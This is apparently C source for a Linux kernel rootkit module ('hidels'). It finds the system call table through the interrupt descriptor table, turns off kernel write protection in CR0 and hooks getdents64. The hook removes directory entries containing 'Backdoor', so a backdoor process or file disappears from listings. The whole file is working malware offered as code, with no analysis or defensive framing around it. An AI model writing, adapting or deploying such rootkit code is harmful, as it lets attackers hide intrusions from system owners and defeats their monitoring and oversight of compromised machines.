#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <asm/uaccess.h>
#include <linux/unistd.h>
//#include <sys/stat.h>
//#include <fcntl.h>
#define CALLOFF 100


int orig_cr0;
//char psname[10]="test1";
char psname[10]="Backdoor";
char *processname=psname;

//module_param(processname, charp, 0);
struct {
    unsigned short limit;
    unsigned int base;
} __attribute__ ((packed)) idtr;

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none,flags;
    unsigned short off2;
} __attribute__ ((packed)) * idt;

struct linux_dirent{
    unsigned long     d_ino;
    unsigned long     d_off;
    unsigned short    d_reclen;
    char* d_name;
};

void** sys_call_table;

unsigned int clear_and_return_cr0(void)
{
    unsigned int cr0 = 0;
    unsigned int ret;

    asm volatile ("movl %%cr0, %%eax"
            : "=a"(cr0)
         );
    ret = cr0;

    /*clear the 20th bit of CR0,*/
    cr0 &= 0xfffeffff;
    asm volatile ("movl %%eax, %%cr0"
            :
            : "a"(cr0)
         );
    return ret;
}

void setback_cr0(unsigned int val)
{
    asm volatile ("movl %%eax, %%cr0"
            :
            : "a"(val)
         );
}


asmlinkage long (*orig_getdents64)(unsigned int fd,
                    struct linux_dirent64 __user *dirp, unsigned int count);

char * findoffset(char *start)
{
    char *p;
    for (p = start; p < start + CALLOFF; p++)
    if (*(p + 0) == '\xff' && *(p + 1) == '\x14' && *(p + 2) == '\x85')
        return p;
    return NULL;
}



asmlinkage long hacked_getdents64(unsigned int fd,
                    struct linux_dirent64 __user *dirp, unsigned int count)
{
    //added by lsc for process
    long value;
    //    struct inode *dinode;
    unsigned short len = 0;
    unsigned short tlen = 0;
//    struct linux_dirent *mydir = NULL;
//end
    value = (*orig_getdents64) (fd, dirp, count);
    tlen = value;
    while(tlen > 0)
    {
        len = dirp->d_reclen;
        tlen = tlen - len;
        printk("%s\n",dirp->d_name);
                             
        if(strstr(dirp->d_name,processname) )
        {
            printk("find process\n");
            memmove(dirp, (char *) dirp + dirp->d_reclen, tlen);
            value = value - len;
            printk(KERN_INFO "hide successful.\n");
        }
        else{
	       if(tlen)
                dirp = (struct linux_dirent *) ((char *)dirp + dirp->d_reclen);
        }
    }
        printk(KERN_INFO "finished hacked_getdents64.\n");
        return value;
}


void **get_sct_addr(void)
{
    unsigned sys_call_off;
    unsigned sct = 0;
    char *p;
    asm("sidt %0":"=m"(idtr));
    idt = (void *) (idtr.base + 8 * 0x80);
    sys_call_off = (idt->off2 << 16) | idt->off1;
    if ((p = findoffset((char *) sys_call_off)))
        sct = *(unsigned *) (p + 3);
    return ((void **)sct);
}


static int filter_init(void)
{
    sys_call_table = get_sct_addr();
    if (!sys_call_table)
    {
        printk("get_sct_addr(): NULL...\n");
        return 0;
    }
    else
        printk("sct: 0x%x\n\n\n\n\n\n", (unsigned int)sys_call_table);
    orig_getdents64 = sys_call_table[__NR_getdents64];
	printk("offset: 0x%x\n\n\n\n",(unsigned int)orig_getdents64);
    orig_cr0 = clear_and_return_cr0();
    sys_call_table[__NR_getdents64] = hacked_getdents64;
    printk("hacked_getdents64: 0x%x\n\n\n\n",(unsigned int)hacked_getdents64);
    setback_cr0(orig_cr0);

    printk(KERN_INFO "hidels: module loaded.\n");
                return 0;
}


static void filter_exit(void)
{
    orig_cr0 = clear_and_return_cr0();
    if (sys_call_table)
    sys_call_table[__NR_getdents64] = orig_getdents64;
    setback_cr0(orig_cr0);
    printk(KERN_INFO "hidels: module removed\n");
}
module_init(filter_init);
module_exit(filter_exit);
MODULE_LICENSE("GPL");
